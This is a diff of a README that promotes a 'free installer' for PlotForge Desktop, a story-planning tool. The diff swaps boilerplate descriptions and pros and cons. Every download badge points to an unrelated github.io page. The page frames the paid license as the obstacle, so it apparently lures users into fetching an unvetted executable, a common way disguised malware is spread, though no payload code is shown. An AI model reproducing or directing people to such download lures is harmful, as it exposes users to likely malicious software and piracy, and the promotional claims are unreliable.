@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Story+Planning-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 PlotForge Desktop Free Installer** — PlotForge Desktop is a story structure and plot planning tool for novelists and screenwriters. Works without internet access, no account required. Full offline installation.
+**💻 PlotForge Desktop Free Installer** — PlotForge Desktop is a story development tool for novelists and screenwriters that provides structured templates for building plots. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install PlotForge Desktop](https://img.shields.io/badge/⬇_Install_PlotForge%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install PlotForge Desktop](https://img.shields.io/badge/⬇_Install_PlotForge+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About PlotForge Desktop
 
-PlotForge Desktop is a story structure and plot planning tool for novelists and screenwriters. It provides customizable story templates, scene cards, character sheets, and a timeline view — helping writers plan stories before beginning the drafting process.
+PlotForge Desktop is a story development tool for novelists and screenwriters that provides structured templates for building plots. Using proven storytelling frameworks like Save the Cat and the Hero's Journey, PlotForge helps writers develop compelling narratives through guided exercises and visual plotting tools. Export outlines and scene breakdowns for use in your preferred writing application.
 
 ---
 
 ## ❌ Problem: PlotForge Desktop is hard to access
 
-- **Paid License** — Requires purchase
-- **Planning Only** — No built-in word processor for actual manuscript writing
-- **Small Community** — Fewer resources and templates than established tools like Scrivener
-- **Import Limitations** — Moving planned content to a drafting tool requires manual work
+- **Template Dependency** — Works best within established story framework templates
+- **Learning Frameworks** — Narrative structure knowledge enhances the tool's utility
+- **Export Format** — Limited export options for integration with other writing software
+- **Update Frequency** — Less actively updated than major writing applications
 
 ---
 
@@ -81,7 +81,7 @@ PlotForge Desktop is a story structure and plot planning tool for novelists and 
 
 <div align="center">
 
-[![⬇ Install PlotForge Desktop](https://img.shields.io/badge/⬇_Install_PlotForge%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install PlotForge Desktop](https://img.shields.io/badge/⬇_Install_PlotForge+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ PlotForge Desktop is a story structure and plot planning tool for novelists and 
 
 ---
 
-**PlotForge Desktop Free Installer** — PlotForge Desktop is a story structure and plot planning tool for novelists and screenwriters. Install without internet connection today!
+**PlotForge Desktop Free Installer** — PlotForge Desktop is a story development tool for novelists and screenwriters that provides structured templates for building plots. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install PlotForge Desktop](https://img.shields.io/badge/⬇_Install_PlotForge%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install PlotForge Desktop](https://img.shields.io/badge/⬇_Install_PlotForge+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
